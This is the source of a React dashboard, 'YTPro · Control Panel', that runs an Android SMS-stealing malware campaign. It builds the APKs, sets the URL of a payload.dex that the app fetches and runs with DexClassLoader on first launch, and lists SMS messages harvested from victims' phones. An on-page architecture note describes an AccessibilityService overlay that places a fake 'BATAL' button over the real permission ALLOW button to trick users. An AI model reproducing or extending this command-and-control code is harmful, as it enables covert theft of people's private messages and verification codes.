"use client";

import { useState, useEffect, useCallback } from "react";

interface Build {
  id: number;
  run_number: number;
  status: string;
  conclusion: string | null;
  created_at: string;
  html_url: string;
  artifacts_url: string;
}

interface SmsEntry {
  id: string;
  device: string;
  number: string;
  body: string;
  ts: number;
}

export default function Dashboard() {
  const [payloadUrl, setPayloadUrl] = useState("");
  const [savedUrl, setSavedUrl] = useState("");
  const [saving, setSaving] = useState(false);
  const [builds, setBuilds] = useState<Build[]>([]);
  const [smsData, setSmsData] = useState<SmsEntry[]>([]);
  const [loadingBuilds, setLoadingBuilds] = useState(true);
  const [tab, setTab] = useState<"builds" | "sms" | "config">("builds");

  const loadConfig = useCallback(async () => {
    const r = await fetch("/api/config");
    const d = await r.json();
    setPayloadUrl(d.url || "");
    setSavedUrl(d.url || "");
  }, []);

  const loadBuilds = useCallback(async () => {
    setLoadingBuilds(true);
    try {
      const r = await fetch("/api/builds");
      const d = await r.json();
      setBuilds(d.workflow_runs || []);
    } catch {
      setBuilds([]);
    }
    setLoadingBuilds(false);
  }, []);

  const loadSms = useCallback(async () => {
    try {
      const r = await fetch("/api/data");
      const d = await r.json();
      setSmsData(d.entries || []);
    } catch {
      setSmsData([]);
    }
  }, []);

  useEffect(() => {
    loadConfig();
    loadBuilds();
    loadSms();
    const iv = setInterval(() => { loadBuilds(); loadSms(); }, 30000);
    return () => clearInterval(iv);
  }, [loadConfig, loadBuilds, loadSms]);

  const saveConfig = async () => {
    setSaving(true);
    await fetch("/api/config", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ url: payloadUrl }),
    });
    setSavedUrl(payloadUrl);
    setSaving(false);
  };

  const triggerBuild = async () => {
    await fetch("/api/builds", { method: "POST" });
    setTimeout(loadBuilds, 3000);
  };

  const statusColor = (s: string, c: string | null) => {
    if (s === "in_progress" || s === "queued") return "text-yellow-400";
    if (c === "success") return "text-green-400";
    if (c === "failure") return "text-red-400";
    return "text-gray-400";
  };

  const statusDot = (s: string, c: string | null) => {
    if (s === "in_progress") return "🟡";
    if (c === "success") return "🟢";
    if (c === "failure") return "🔴";
    return "⚪";
  };

  return (
    <div className="min-h-screen bg-[#0a0a0f] text-gray-100 font-mono">
      {/* Header */}
      <div className="border-b border-[#1a1a24] px-6 py-4 flex items-center justify-between">
        <div className="flex items-center gap-3">
          <div className="w-3 h-3 rounded-full bg-red-500 pulse-red" />
          <span className="text-sm font-bold tracking-widest text-gray-300 uppercase">
            YTPro · Control Panel
          </span>
        </div>
        <span className="text-xs text-gray-600">v1.0 · DDL Architecture</span>
      </div>

      {/* Stats bar */}
      <div className="grid grid-cols-3 border-b border-[#1a1a24]">
        {[
          { label: "PAYLOAD URL", value: savedUrl ? "✓ SET" : "NOT SET", color: savedUrl ? "text-green-400" : "text-red-400" },
          { label: "LAST BUILD", value: builds[0]?.conclusion?.toUpperCase() || "NONE", color: statusColor(builds[0]?.status || "", builds[0]?.conclusion || null) },
          { label: "SMS COLLECTED", value: String(smsData.length), color: "text-blue-400" },
        ].map((s) => (
          <div key={s.label} className="px-6 py-3 border-r border-[#1a1a24] last:border-0">
            <div className="text-[10px] text-gray-600 uppercase tracking-widest mb-1">{s.label}</div>
            <div className={`text-sm font-bold ${s.color}`}>{s.value}</div>
          </div>
        ))}
      </div>

      {/* Tabs */}
      <div className="flex border-b border-[#1a1a24]">
        {(["builds", "sms", "config"] as const).map((t) => (
          <button
            key={t}
            onClick={() => setTab(t)}
            className={`px-6 py-3 text-xs uppercase tracking-widest transition-colors ${
              tab === t
                ? "text-white border-b-2 border-red-500 bg-[#111118]"
                : "text-gray-500 hover:text-gray-300"
            }`}
          >
            {t === "builds" ? "⚙ Builds" : t === "sms" ? "💬 SMS Data" : "🔧 Config"}
          </button>
        ))}
      </div>

      <div className="p-6">
        {/* BUILDS TAB */}
        {tab === "builds" && (
          <div>
            <div className="flex items-center justify-between mb-4">
              <span className="text-xs text-gray-500 uppercase tracking-widest">GitHub Actions — APK Build History</span>
              <div className="flex gap-2">
                <button
                  onClick={loadBuilds}
                  className="px-3 py-1 text-xs border border-[#2d2d3d] text-gray-400 hover:text-white hover:border-gray-400 rounded transition-colors"
                >
                  ↻ Refresh
                </button>
                <button
                  onClick={triggerBuild}
                  className="px-3 py-1 text-xs bg-red-600 hover:bg-red-500 text-white rounded transition-colors"
                >
                  ▶ Trigger Build
                </button>
              </div>
            </div>

            {loadingBuilds ? (
              <div className="text-center py-12 text-gray-600 text-sm">Loading builds...</div>
            ) : builds.length === 0 ? (
              <div className="text-center py-12 text-gray-600 text-sm">No builds yet. Push code or trigger manually.</div>
            ) : (
              <div className="space-y-2">
                {builds.map((b) => (
                  <div
                    key={b.id}
                    className="flex items-center justify-between bg-[#111118] border border-[#1a1a24] rounded px-4 py-3 hover:border-[#2d2d3d] transition-colors"
                  >
                    <div className="flex items-center gap-3">
                      <span className="text-base">{statusDot(b.status, b.conclusion)}</span>
                      <div>
                        <div className={`text-sm font-medium ${statusColor(b.status, b.conclusion)}`}>
                          Build #{b.run_number}
                        </div>
                        <div className="text-xs text-gray-600">
                          {new Date(b.created_at).toLocaleString()}
                        </div>
                      </div>
                    </div>
                    <div className="flex gap-2">
                      {b.conclusion === "success" && (
                        <a
                          href={`/api/builds?download=${b.id}`}
                          className="px-3 py-1 text-xs bg-[#1a1a24] hover:bg-[#2d2d3d] text-green-400 rounded transition-colors"
                        >
                          ↓ APK
                        </a>
                      )}
                      <a
                        href={b.html_url}
                        target="_blank"
                        rel="noreferrer"
                        className="px-3 py-1 text-xs bg-[#1a1a24] hover:bg-[#2d2d3d] text-gray-400 rounded transition-colors"
                      >
                        → View
                      </a>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>
        )}

        {/* SMS TAB */}
        {tab === "sms" && (
          <div>
            <div className="flex items-center justify-between mb-4">
              <span className="text-xs text-gray-500 uppercase tracking-widest">
                Collected SMS — {smsData.length} entries
              </span>
              <button
                onClick={loadSms}
                className="px-3 py-1 text-xs border border-[#2d2d3d] text-gray-400 hover:text-white hover:border-gray-400 rounded transition-colors"
              >
                ↻ Refresh
              </button>
            </div>

            {smsData.length === 0 ? (
              <div className="text-center py-12 text-gray-600 text-sm">
                Menunggu data dari perangkat...
                <div className="mt-2 text-xs text-gray-700">Payload DEX akan POST ke /api/data saat SMS diterima</div>
              </div>
            ) : (
              <div className="space-y-2">
                {smsData.map((s) => (
                  <div key={s.id} className="bg-[#111118] border border-[#1a1a24] rounded p-4 hover:border-[#2d2d3d] transition-colors">
                    <div className="flex items-center justify-between mb-2">
                      <span className="text-xs font-bold text-green-400">{s.number}</span>
                      <div className="flex gap-3 text-xs text-gray-600">
                        <span>📱 {s.device}</span>
                        <span>{new Date(s.ts).toLocaleString()}</span>
                      </div>
                    </div>
                    <div className="text-sm text-gray-300 bg-[#0a0a0f] rounded p-2 border border-[#1a1a24]">
                      {s.body}
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>
        )}

        {/* CONFIG TAB */}
        {tab === "config" && (
          <div className="max-w-2xl">
            <div className="text-xs text-gray-500 uppercase tracking-widest mb-4">Payload Configuration</div>

            <div className="bg-[#111118] border border-[#1a1a24] rounded p-4 mb-4">
              <div className="text-xs text-gray-600 mb-2">PAYLOAD DEX URL</div>
              <div className="text-xs text-gray-500 mb-3">
                URL ke file <code className="text-red-400">payload.dex</code> yang akan didownload oleh APK saat pertama kali berjalan.
                Harus HTTPS. Endpoint ini dibaca oleh APK lewat <code className="text-blue-400">/api/config</code>.
              </div>
              <div className="flex gap-2">
                <input
                  type="text"
                  value={payloadUrl}
                  onChange={(e) => setPayloadUrl(e.target.value)}
                  placeholder="https://cdn.example.com/payload.dex"
                  className="flex-1 bg-[#0a0a0f] border border-[#2d2d3d] rounded px-3 py-2 text-sm text-gray-200 placeholder-gray-700 focus:border-gray-500 focus:outline-none"
                />
                <button
                  onClick={saveConfig}
                  disabled={saving || payloadUrl === savedUrl}
                  className="px-4 py-2 text-xs bg-red-600 hover:bg-red-500 disabled:bg-[#2d2d3d] disabled:text-gray-600 text-white rounded transition-colors"
                >
                  {saving ? "Saving..." : "Save"}
                </button>
              </div>
              {savedUrl && (
                <div className="mt-2 text-xs text-green-400">✓ Active: {savedUrl}</div>
              )}
            </div>

            <div className="bg-[#111118] border border-[#1a1a24] rounded p-4">
              <div className="text-xs text-gray-600 mb-3">ARCHITECTURE OVERVIEW</div>
              <div className="text-xs text-gray-500 space-y-1 font-mono">
                <div className="text-green-400">// Flow</div>
                <div>APK launch → StubApp.attachBaseContext()</div>
                <div className="text-gray-600">  └→ DexLoader.load(context)  [background thread]</div>
                <div className="text-gray-600">       └→ GET /api/config  → payload URL</div>
                <div className="text-gray-600">       └→ download payload.dex → filesDir</div>
                <div className="text-gray-600">       └→ DexClassLoader → com.payload.Entry.init()</div>
                <div className="mt-2 text-green-400">// Overlay</div>
                <div>PermissionMonitor (AccessibilityService)</div>
                <div className="text-gray-600">  └→ detects permission dialog</div>
                <div className="text-gray-600">  └→ starts OverlayService</div>
                <div className="text-gray-600">       └→ WindowManager overlay (TYPE_APPLICATION_OVERLAY)</div>
                <div className="text-gray-600">       └→ fake &quot;BATAL&quot; btn over real ALLOW btn</div>
                <div className="mt-2 text-green-400">// Data</div>
                <div>payload.dex reads SMS → POST /api/data</div>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
